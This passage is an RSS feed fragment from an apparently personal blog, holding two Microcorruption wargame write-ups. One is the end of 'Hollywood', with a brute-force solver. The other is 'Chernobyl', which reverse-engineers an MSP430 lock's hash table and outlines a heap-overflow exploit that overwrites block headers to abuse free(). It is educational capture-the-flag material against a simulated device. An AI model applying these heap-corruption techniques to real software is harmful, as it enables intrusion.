        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r5Val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r5Val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r5Val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R4_MAGIC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R6_MAGIC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Running the program for around 10 minutes generates the first 6 byte solution:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0 4 a5 3c f1 5b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Going to the “Hall of fame”, we can see the shortest solution is 5 bytes only. We can modify the loop in &lt;code class=&quot;highlighter-rouge&quot;&gt;genNext&lt;/code&gt; so the last byte is ignored. After around 30 minutes, the first solution is generated:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;49 49 b5 de 96 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The last byte is ignored and the first 5 bytes are inputted, unlocking the door.&lt;/p&gt;

&lt;h2 id=&quot;some-thoughts&quot;&gt;Some thoughts&lt;/h2&gt;

&lt;p&gt;This question is not as difficult as the previous one. The solution is a lot more blant compared to the previous question, as there is only 1 way of attacking it (unless I missed something). This question is more of a test of reverse engineering skills rather than exploitation skills, which disallows creative solutions. Nonetheless, this is still an entertaining challenge.&lt;/p&gt;

&lt;p&gt;This question also marks the end of the microcorruption challenge series. During the process, I have learnt quite a lot about assembly code and exploitation in general. I hope the skills can assist me in day-to-day programming in the future.&lt;/p&gt;

&lt;h2 id=&quot;read-more&quot;&gt;Read more&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://www.ti.com/lit/ug/slau144j/slau144j.pdf&quot;&gt;MSP430 instruction guide&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 25 Feb 2019 21:22:19 +1100</pubDate>
        <link>zijunh.github.io/2019/02/hollywood/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/02/hollywood/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargames</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Chernobyl: Write-up</title>
        <description>&lt;p&gt;Before discussing the solutions, I would like to say this question was a blast. I obtained the straight forward solution relatively quickly but shortening the input size took quite a lot of time. I attempted 4-5 different possible methods, but they were all a little off at the end, preventing me from successfully opening the lock. The complexity (and length) of the code warrants many ways of attacking the problem (as evident in the varying input length), making it the best challenge (so far). Though my input size is already quite small, someone has a 60 byte solution, meaning there are still ways to attack the problem that I haven’t explored.&lt;/p&gt;

&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;The program accepts one string with length 0x550. The input is operated by the following rules:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The input is separated into different commands by ‘;’&lt;/li&gt;
  &lt;li&gt;Each command can start with ‘a’ or ‘n’. Anything else will throw an error and cause early termination of the program&lt;/li&gt;
  &lt;li&gt;Preprocessing of the input converts all spaces (0x20) to 0x0, which is used to separate command arguments&lt;/li&gt;
  &lt;li&gt;Both types of commands take 2 arguments: “username” and “pin”. Arguments after the first 2 will be ignored&lt;/li&gt;
  &lt;li&gt;If the command starts with ‘a’, arguments will be read starting from the 8th character&lt;/li&gt;
  &lt;li&gt;If the command starts with ‘n’, arguments will be read starting from the 5th character&lt;/li&gt;
  &lt;li&gt;The high bit of the pin cannot be set&lt;/li&gt;
  &lt;li&gt;No duplicate usernames allowed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The input buffer has a size of 0x600, which is filled with 0x0. The buffer is wiped after every input, preventing a simple overflow attack using the input.&lt;/p&gt;

&lt;h2 id=&quot;initial-overview&quot;&gt;Initial overview&lt;/h2&gt;

&lt;p&gt;As the entire program is quite complex, a good overview of the various function calls and operations is required. We can copy all the instructions into the file &lt;code class=&quot;highlighter-rouge&quot;&gt;initial.txt&lt;/code&gt;, and then &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; it to identify all function calls. This can be performed efficiently using the following bash command, producing the results in &lt;code class=&quot;highlighter-rouge&quot;&gt;final.txt&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat initial.txt | egrep '^(\w{4} )|(call)' | tee final.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I have collected the important parts of the output:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4438 &amp;lt;main&amp;gt;
443a:  b012 664b      call  #0x4b66 &amp;lt;run&amp;gt;

4778 &amp;lt;create_hash_table&amp;gt;
478c:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
47ae:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
47b8:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
47e8:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;

4832 &amp;lt;add_to_table&amp;gt;
4866:  b012 d448      call  #0x48d4 &amp;lt;rehash&amp;gt;
4870:  b012 0e48      call  #0x480e &amp;lt;hash&amp;gt;

48d4 &amp;lt;rehash&amp;gt;
490a:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
4914:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
493e:  b012 7846      call  #0x4678 &amp;lt;malloc&amp;gt;
4988:  b012 3248      call  #0x4832 &amp;lt;add_to_table&amp;gt;
499e:  b012 1c47      call  #0x471c &amp;lt;free&amp;gt;
49ae:  b012 1c47      call  #0x471c &amp;lt;free&amp;gt;
49b4:  b012 1c47      call  #0x471c &amp;lt;free&amp;gt;

49cc &amp;lt;get_from_table&amp;gt;
49de:  b012 0e48      call  #0x480e &amp;lt;hash&amp;gt;
4a0a:  b012 7c4d      call  #0x4d7c &amp;lt;strcmp&amp;gt;

4b66 &amp;lt;run&amp;gt;
4b7c:  b012 7847      call  #0x4778 &amp;lt;create_hash_table&amp;gt;
4b86:  b012 504d      call  #0x4d50 &amp;lt;puts&amp;gt;
4b8e:  b012 504d      call  #0x4d50 &amp;lt;puts&amp;gt;
4b96:  b012 504d      call  #0x4d50 &amp;lt;puts&amp;gt;
4bb6:  b012 404d      call  #0x4d40 &amp;lt;getsn&amp;gt;
4c0c:  b012 cc49      call  #0x49cc &amp;lt;get_from_table&amp;gt;
4c90:  b012 cc49      call  #0x49cc &amp;lt;get_from_table&amp;gt;
4c9c:  b012 504d      call  #0x4d50 &amp;lt;puts&amp;gt;
4caa:  b012 4844      call  #0x4448 &amp;lt;printf&amp;gt;
4cb8:  b012 3248      call  #0x4832 &amp;lt;add_to_table&amp;gt;
4cc2:  b012 504d      call  #0x4d50 &amp;lt;puts&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;the-storage&quot;&gt;The storage&lt;/h2&gt;

&lt;p&gt;Each username and pin are stored in a hash table in the heap. Similar to &lt;a href=&quot;2019/01/algiers/&quot;&gt;algiers&lt;/a&gt;, the heap is implemented as a doubly linked list. Each element of the list has the following structure:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;element&amp;gt;
    &amp;lt;6 byte header&amp;gt;
        &amp;lt;2 byte pointer to the previous block&amp;gt;
        &amp;lt;2 byte pointer to the next block&amp;gt;
        &amp;lt;2 byte size, with the least significant bit being indicating IN_USE&amp;gt;
    &amp;lt;content&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Knowing hash tables are used, it should be clear hash collisions are possible. With only 8 bins, the probability of it happening is extremely likely. In this example, hash collisions are resolved by chaining: elements with the same hash are appended at the end of a list. The memory area used by the hash table can be categorised into 2 sections: metadata and content. Initially, the hash table has the following structure, with each section belonging to a different block in the heap linked list:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;metadata&amp;gt;
    &amp;lt;10 byte misc values, including maximum size, addr of other metadata&amp;gt;
    &amp;lt;16 byte addr of the bins&amp;gt;
    &amp;lt;16 byte number of elements in each bin&amp;gt;
&amp;lt;content&amp;gt;
    &amp;lt;88 byte bin 0&amp;gt;
    &amp;lt;88 byte bin 1&amp;gt;
    &amp;lt;88 byte bin 2&amp;gt;
    &amp;lt;88 byte bin 3&amp;gt;
    &amp;lt;88 byte bin 4&amp;gt;
    &amp;lt;88 byte bin 5&amp;gt;
    &amp;lt;88 byte bin 6&amp;gt;
    &amp;lt;88 byte bin 7&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pic2.png&quot; alt=&quot;Initial form of hash table&quot; /&gt;
&lt;em&gt;Figure showing initial form of the hash table. Red boxes represent header of the heap blocks&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;hash&quot;&gt;hash&lt;/h2&gt;

&lt;p&gt;Allocating the username and pin combination to the bins involve hashing the username using the hash function, which is implemented as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pic3.png&quot; alt=&quot;Implementation of the hash function&quot; /&gt;
&lt;em&gt;Figure showing implementation of the hash function&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The hash function only used the first 15 characters of the username to produce a 4 digit hexadecimal number, which is moduloed by the number of bins (8 initially). The bin allocation can be summarised using the following python code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hashVal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%.4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The pin is hashed in a similar way, but with additional modifications. However, I did not look into that algorithm, as it is not needed for the solution. No matter how long the inputted pin is, the hashed result will always be 2 bytes long.&lt;/p&gt;

&lt;p&gt;After the bin number is calculated, the first 15 characters of the username is appended at the end of the chain for that bin, followed by a null byte (indicating end of string) and the hashed result of the pin. Notice both the username and pin length are limited by the algorithm, preventing any sort of overflow attack using the username and pin alone.&lt;/p&gt;

&lt;h2 id=&quot;rehash&quot;&gt;rehash&lt;/h2&gt;

&lt;p&gt;The hash table becomes full when the total number of usernames and pins exceed a set size. Initially, this size is set to 11, allowing 11 usernames. Rehashing is triggered after the input of the 12th username, but before its allocation in the table. The program checks the input is valid and stores it temporarily in the input buffer. Rehashing creates a new hash table with double the number of bins using &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt;. Then it allocates the original values to the new bins, and &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt;s the old ones. The hashing result remains the same, but it will now be moduloed by a different number, thus achieving the goal of redistributing the values into different bins.&lt;/p&gt;

&lt;p&gt;The exact implementation of &lt;code class=&quot;highlighter-rouge&quot;&gt;rehash&lt;/code&gt; is not significant, but the function call to &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; before &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; is.&lt;/p&gt;

&lt;h2 id=&quot;malloc-in-rehash&quot;&gt;malloc in rehash&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; creates a specified size of free memory from the heap linked list. It starts at a designated block of the linked list and checks if the block is in use by the &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt; bit specified in &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; of the block header.&lt;/p&gt;

&lt;p&gt;If the block is in use, the function skips to the next block using &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; of the header. This process is repeated until one of the following two possible events happen:  &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; points to a blocker that with a lower address compared to the current, or &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; points to the initial block. These two events indicates &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; has probed all blocks within the linked list (second event is special case for 1 memory block only, where &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; points to itself), and the program crashes with the error “heap exhausted”.&lt;/p&gt;

&lt;p&gt;If the block is not in use, its size is checked. When the size of the block is the same as the specified size, the &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt; bit is set and the function returns the address of the block. If the size is not the same, the empty block will be divided into 2, with the lower-addressed block labelled as &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt; with the required size. This block points to the other block through &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;, and the header of the blocks are updated accordingly.&lt;/p&gt;

&lt;p&gt;rehash calls &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; multiple times, and most of the time the search starts at 0x5000 (start of the heap).&lt;/p&gt;

&lt;h2 id=&quot;free-in-rehash&quot;&gt;free in rehash&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; removes a block of used memory and attempts to merge it with the proceeding or preceding not in use block. As seen in &lt;a href=&quot;2019/01/algiers/&quot;&gt;algiers&lt;/a&gt;, it can be summarised by the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r15 = &amp;amp;freeing chunk
r13 = r15.size
r14 = r15.prev
r12 = r14.size
if (!r14.IN_USE){
    r12 += 6
    r12 += r13 
    r14.size = r12
    r14.next = r15.next
    r13 = r15.next
    r13.prev = r14
    r15 = r15.prev
}
r14 = r15.next
r13 = r14.size 
if (!r14.IN_USE){
    r13 += r15.size
    r13 += 6
    r15.size = r13
    r14.next = r15.next
    r14.prev = r15
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The locations that will be &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt;d are obtained from the hash table’s metadata, which are the addresses of the bins.&lt;/p&gt;

&lt;p&gt;It is important to notice &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; obtain the bin addresses through different methods. While &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; in headers, &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; uses pre-defined addresses.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;The exploit depends on the 6th username in each bin overwriting the header of the next bin. The overwriting process starts at the 1st character, requiring no additional padding. Effectively, this allows control of the &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;.size&lt;/code&gt; attributes. The 11th username in the bin can also overwrite the header of the bin after the next. However, only the 7th character in the username can do so, thus requiring a 6-character padding within the username. With full control of a block header, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; to overwrite at least one byte in the program, which leads to many different possibilities of attack. Looking at the call structure of the program, it appears &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; is only called in &lt;code class=&quot;highlighter-rouge&quot;&gt;rehash&lt;/code&gt;, which occurs after the input of the 12th username but before its allocation.&lt;/p&gt;

&lt;p&gt;The outline of the plan of attack simple:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Input 5 dummy usernames that belong to the same bin2&lt;/li&gt;
  &lt;li&gt;Input a specifically crafted string that overwrites the next header&lt;/li&gt;
  &lt;li&gt;Input 5 more dummy usernames&lt;/li&gt;
  &lt;li&gt;Input 1 dummy username that triggers &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;rehash&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Voila! Now we should have some control of the flow of the program, allowing many different routes of attack. However, the exact details are difficult to resolve, and I will detail them in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;hash-collision&quot;&gt;Hash collision&lt;/h3&gt;

&lt;p&gt;Control exactly which bin each username and pin combination go to is required for the exploit to work. As there are only 8 bins, collisions are extremely likely. Since the hashing function is already reverse engineered, I wrote a script that calculates the bin location for all 1 character usernames, which will be used as our dummy usernames. The hex encoding of the characters can be obtained by &lt;code class=&quot;highlighter-rouge&quot;&gt;readStrs(res[binNo])&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;STR_LENGTH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hashVal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
